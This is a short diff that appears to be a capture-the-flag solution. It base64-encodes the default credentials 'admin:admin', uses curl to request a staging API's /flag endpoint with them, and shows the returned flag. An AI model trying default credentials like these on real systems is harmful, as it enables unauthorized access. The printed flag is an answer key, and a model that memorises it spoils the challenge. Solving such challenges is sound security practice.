@@ -1,0 +1,4 @@
+$ echo -n 'admin:admin' | base64
+YWRtaW46YWRtaW4=
+$ curl -X GET   'http://staging-api.congon4tor.com:7777/flag'   -H 'accept: application/json' -H 'Authorization: Basic YWRtaW46YWRtaW4='
+{"flag":"flag{e04f962d0529a4289a685112bf1dcdd3}"}
